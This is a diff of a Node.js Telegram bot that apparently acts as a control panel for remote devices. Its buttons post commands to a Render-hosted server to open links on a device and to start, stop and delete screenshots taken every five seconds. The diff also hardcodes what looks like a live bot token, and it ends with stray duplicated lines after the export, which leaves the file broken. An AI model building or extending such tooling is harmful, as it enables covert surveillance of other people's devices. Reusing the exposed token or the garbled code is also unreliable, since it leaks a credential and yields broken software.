@@ -1,11 +1,22 @@
 const TelegramBot = require("node-telegram-bot-api");
+const axios = require("axios");
 const { devices } = require("./devices");
 
-const TOKEN = "PASTE_YOUR_BOT_TOKEN";
-const OWNER_ID = 123456789; // আপনার Telegram numeric ID
+// ===================
+// CONFIGURATION
+// ===================
+const TOKEN = "8221261457:AAFrXAUvBFbdc4TUFB3YlP8pkdl1oAefvP4"; 
+const OWNER_ID = 7434833085;       // আপনার Telegram ID
+const SERVER_URL = "https://fun-yy3s.onrender.com"; // Render live server
 
+// ===================
+// INIT BOT
+// ===================
 const bot = new TelegramBot(TOKEN, { polling: true });
 
+// ===================
+// /start command
+// ===================
 bot.onText(/\/start/, msg => {
   if (msg.from.id !== OWNER_ID) return;
 
@@ -18,12 +29,16 @@ bot.onText(/\/start/, msg => {
   });
 });
 
-bot.on("callback_query", query => {
+// ===================
+// Callback handler
+// ===================
+bot.on("callback_query", async query => {
   if (query.from.id !== OWNER_ID) return;
 
   const chatId = query.message.chat.id;
   const data = query.data;
 
+  // Device click → show options
   if (data.startsWith("dev_")) {
     const id = data.replace("dev_", "");
     bot.sendMessage(chatId, `📱 ${devices[id].name}`, {
@@ -34,6 +49,55 @@ bot.on("callback_query", query => {
           [{ text: "⛔ Stop Screenshot", callback_data: `stop_${id}` }],
           [{ text: "⬅ Back", callback_data: "back" }]
         ]
+      }
+    });
+  }
+
+  // Open Link
+  if (data.startsWith("open_")) {
+    const id = data.replace("open_", "");
+    const url = "https://example.com"; // পরবর্তী ধাপে user input দিতে পারবেন
+    try {
+      await axios.post(`${SERVER_URL}/open-link`, { id, url });
+      bot.sendMessage(chatId, "Link sent to device ✅");
+    } catch (err) {
+      bot.sendMessage(chatId, "Error sending link ❌");
+      console.error(err);
+    }
+  }
+
+  // Start Screenshot
+  if (data.startsWith("shot_")) {
+    const id = data.replace("shot_", "");
+    const interval = 5; // seconds, Bot button থেকে later changeable
+    try {
+      await axios.post(`${SERVER_URL}/start-shot`, { id, interval });
+      bot.sendMessage(chatId, `Screenshot started 📸 (every ${interval}s)`);
+    } catch (err) {
+      bot.sendMessage(chatId, "Error starting screenshot ❌");
+      console.error(err);
+    }
+  }
+
+  // Stop Screenshot
+  if (data.startsWith("stop_")) {
+    const id = data.replace("stop_", "");
+    try {
+      await axios.post(`${SERVER_URL}/stop-shot`, { id });
+      bot.sendMessage(chatId, "Screenshot stopped and deleted 🧹");
+    } catch (err) {
+      bot.sendMessage(chatId, "Error stopping screenshot ❌");
+      console.error(err);
+    }
+  }
+
+  // Back button
+  if (data === "back") {
+    bot.sendMessage(chatId, "Back to main menu");
+  }
+});
+
+module.exports = bot;
       }
     });
   }
